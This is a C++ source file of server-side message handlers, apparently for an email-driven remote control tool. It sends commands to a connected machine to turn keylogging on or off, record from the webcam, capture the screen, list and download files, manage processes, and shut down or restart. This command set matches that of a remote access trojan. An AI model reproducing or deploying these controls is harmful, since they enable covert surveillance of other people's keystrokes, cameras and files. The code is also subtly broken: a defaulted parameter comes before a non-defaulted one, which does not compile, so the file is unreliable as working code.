#include "ServerMessageHandler.hpp"

bool MessageRawTextServerHandler(PeerConnection& client, const std::string& rawText, const std::string& emailFrom) {
    Message textMessage;
    textMessage.commandNumber = MessageRawText;
    textMessage.setBinaryData(rawText.c_str(), rawText.size());
    json jsonData;
    jsonData["email"] = emailFrom;
    textMessage.setJsonData(jsonData);
    return client.sendData(textMessage);
}

bool MessageEnableKeylogServerHandler(PeerConnection& client, const std::string& emailFrom) {
    Message msg;
    msg.commandNumber = MessageEnableKeylog;
    json jsonData;
    jsonData["email"] = emailFrom;
    msg.setJsonData(jsonData);
    return client.sendData(msg);
}

bool MessageDisableKeylogServerHandler(PeerConnection& client, const std::string& emailFrom) {
    Message msg;
    msg.commandNumber = MessageDisableKeylog;
    json jsonData;
    jsonData["email"] = emailFrom;
    msg.setJsonData(jsonData);
    return client.sendData(msg);
}

bool MessageInvokeWebcamServerHandler(PeerConnection& client, int millisecond, int fps = 30, const std::string& emailFrom) {
    Message msg;
    msg.commandNumber = MessageInvokeWebcam;
    json jsonData;
    jsonData["millisecond"] = millisecond;
    jsonData["fps"] = fps;
    jsonData["email"] = emailFrom;
    msg.setJsonData(jsonData);
    return client.sendData(msg);
}
bool MessageScreenCapServerHandler(PeerConnection& client, const std::string& emailFrom) {
    Message msg;
    msg.commandNumber = MessageScreenCap;
    json jsonData;
    jsonData["email"] = emailFrom;
    msg.setJsonData(jsonData);
    return client.sendData(msg);
}
bool MessageListFileServerHandler(PeerConnection& client, const std::string& path, const std::string& emailFrom) {
    Message msg;
    msg.commandNumber = MessageListFile;
    json jsonData;
    jsonData["fileName"] = path;
    jsonData["email"] = emailFrom;
    msg.setJsonData(jsonData);
    return client.sendData(msg);
}

bool MessageGetFileServerHandler(PeerConnection& client, const std::string& filename, const std::string& emailFrom) {
    Message msg;
    msg.commandNumber = MessageGetFile;
    json jsonData;
    jsonData["fileName"] = filename;
    jsonData["email"] = emailFrom;
    msg.setJsonData(jsonData);
    return client.sendData(msg);
}

bool MessageStartProcessServerHandler(PeerConnection& client, const std::string& emailFrom) {
    Message msg;
    msg.commandNumber = MessageStartProcess;
    json jsonData;
    jsonData["email"] = emailFrom;
    msg.setJsonData(jsonData);
    return client.sendData(msg);
}

bool MessageStopProcessServerHandler(PeerConnection& client, const std::string& emailFrom) {
    Message msg;
    msg.commandNumber = MessageStopProcess;
    json jsonData;
    jsonData["email"] = emailFrom;
    msg.setJsonData(jsonData);
    return client.sendData(msg);
}

bool MessageListProcessServerHandler(PeerConnection& client, const std::string& commandLine, const std::string& emailFrom) {
    Message msg;
    msg.commandNumber = MessageListProcess;
    msg.setBinaryData(commandLine.c_str(), commandLine.size());
    json jsonData;
    jsonData["email"] = emailFrom;
    msg.setJsonData(jsonData);
    return client.sendData(msg);
}

bool MessageShutdownMachineServerHandler(PeerConnection& client, const std::string& emailFrom) {
    //Special function: just don't send back data
    Message msg;
    msg.commandNumber = MessageShutdownMachine;
    return client.sendData(msg);
}

bool MessageRestartMachineServerHandler(PeerConnection& client, const std::string& emailFrom) {
    //Special function: just don't send back data
    Message msg;
    msg.commandNumber = MessageRestartMachine;
    return client.sendData(msg);
}